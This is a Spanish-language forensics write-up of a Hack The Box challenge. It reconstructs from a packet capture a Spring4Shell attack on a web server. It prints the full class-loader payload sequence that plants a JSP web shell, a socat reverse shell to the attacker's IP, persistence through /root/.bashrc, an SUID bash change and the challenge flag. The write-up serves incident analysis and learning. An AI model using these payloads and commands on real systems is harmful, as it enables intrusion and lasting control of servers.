# "Wrong Spooky Season"
-----------------------

Nos dan un archivo "zip" que se traduce en una captura "pccap". Este se abre con la contraseña "hackthebox" (nos la dan) Junto a una descripción 
del reto.

```
"Les dije que era muy pronto y no era la estacíon correcta para lanzar semejante web, pero me aseguraron que
darle esta temática seria suficiente para evitar que los fantasmas fueran a por nosotros. Estaba equivcado"

Ahora, hay una brecha de seguridad en la "Spooky Network" y necesito que encuentres que ha pasado. Analiza la 
red y descubre como entraron los fantasmas y que hicieron
```

Si abrimos la captura vemos un montón de tráfico entre estos dos sistemas: 
"192.168.1.180" (cliente) y "192.168.1.166" (servidor, aloja una web por el puerto 8080) 
Viendo estas IPs "192.168.1..." parece una LAN de Clase C (pequeñita, domestica).
![forensics1](https://user-images.githubusercontent.com/96772264/208401004-f5fe71d8-d4d1-40ce-9880-31ff8171352e.PNG)

Lo primero, hay mucho tráfico TCP, pero lo que nos interesa es el HTTP, o sea la interación por la web.

Cuando accedes a una web, le pides unos cuantos recursos como imagenes, codigo fuente y hoja de estilos que el navegador se encarga de colocar de 
una manera vistosa. 
![forensics2](https://user-images.githubusercontent.com/96772264/208401109-8c27f3b4-52cb-4641-887a-64b510c27f91.PNG)

Las primeras 30 peticiones son justo eso, así que las ignoraremos. Lo critico viene con las /POST (envió de datos/formularios)

Si seleccionamos un paquete /POST y le damos a "seguir tráfico TCP" podemos ver a la derecha todo el contenido.
Podemos copiarnos el html en un archivo "index.html" y hostearlo en un servidor para ver como se vería la web.
![forensics5](https://user-images.githubusercontent.com/96772264/208401241-6f38c1db-b266-4906-a397-7b3d658cf85d.PNG)

Solo tenemos un formulario ("Enter email adress"), asi que si ha habido un ataque sera ahí.
![forensics3](https://user-images.githubusercontent.com/96772264/208401143-25cce307-d9f6-4908-8f69-468dc3a317dd.PNG)


A /home manda una cadena "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
![forensics4](https://user-images.githubusercontent.com/96772264/208401179-9daa6606-9966-4c05-8cbf-629f91d4d8ad.PNG)

No tengo ni idea de que es, asi que la busco en google y pone "Spring4Shell". La información que consigo es la
siguiente:
- Spring4Shell se parece en nombre a Log4Shell, y en efecto, ambas son vunls de java, en concreto esta afecta a "Spring Framework"  
- Dicho Framework utiliza "Spring Boot" que hace que los desarolladores puedan poner en marcha de manera rapida sus aplicaciones.  
- Por su esructura es muy similar a Flask en Python.  
- El asunto esque este framework utiliza "templates" (o sea como pasa con python) por lo que se da el cláscio STTI  

```"Tu te llamas" + ${nombre}``` 
El STTI accede a las clases y de ahí va escalando y moviendose hasta encontrar un modulo de ejecucion de comandos.

1. /home -> ```{"class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat":""}```  
Supongo que para comprobar si es inyectable, como el clasico {{7*7}} -> 16  

2. ```{"class.module.classLoader.resources.context.parent.pipeline.first.pattern":"%{prefix}i java.io.InputStream in = %{c}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } %{suffix}i"}```  
Parece el contenido de una backdoor (programado en java).  

3. ```{"class.module.classLoader.resources.context.parent.pipeline.first.suffix":".jsp"}```  
Archivo de java para codigo web, en concreto para crear la backdoor.  

4. ```{"class.module.classLoader.resources.context.parent.pipeline.first.directory":"webapps/ROOT"}```  
Directorio donde va a poner la backdoor.  

5. ```{"class.module.classLoader.resources.context.parent.pipeline.first.prefix":"e4d1c32a56ca15b3"}```  
El nombre de dicha "backdoor.jsp"  

6. ```{"class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat":""}```  
7. ```{"class.module.classLoader.resources.context.parent.pipeline.first.pattern":""}```  
Supongo que serán para que se guarde o que e active no se.  

El resto son interacciones con esta backdoor:  
```
/GET /e4d1c32a56ca15b3.jsp?cmd=whoami
/GET /e4d1c32a56ca15b3.jsp?cmd=id
/GET /e4d1c32a56ca15b3.jsp?cmd=apt -y install socat  # instalar socat
/GET /e4d1c32a56ca15b3.jsp?cmd=socat TCP:192.168.1.180:1337 EXEC:bash  # mandale una shell a su IP con socat
```

Una vez hecho esto el atacante entró en el sistema, se acabo el flujo HTTP, asi que ahora tenemos que fijarnos en el TCP. 
Se pone a enumerar el sistema en busca de vulns ```id, cat /etc/passwd, groups, uname -r, find / -perm -u=s -type f 2>/dev/null```
Al final ```echo 'socat TCP:192.168.1.180:1337 EXEC:sh' > /root/.bashrc``` para ganar persistencia que cada vez que alguien abra una consola se le mande a él.
```chmod +s /bin/bash``` hacer a la bash SUID 
![forensics7](https://user-images.githubusercontent.com/96772264/208401290-29f21e89-b805-4ea2-adc2-56fe094a07f0.PNG)

Uno de los comandos que hace es este: ```echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev > /dev/null``` 
Que se traduce en la flag: ```HTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}```
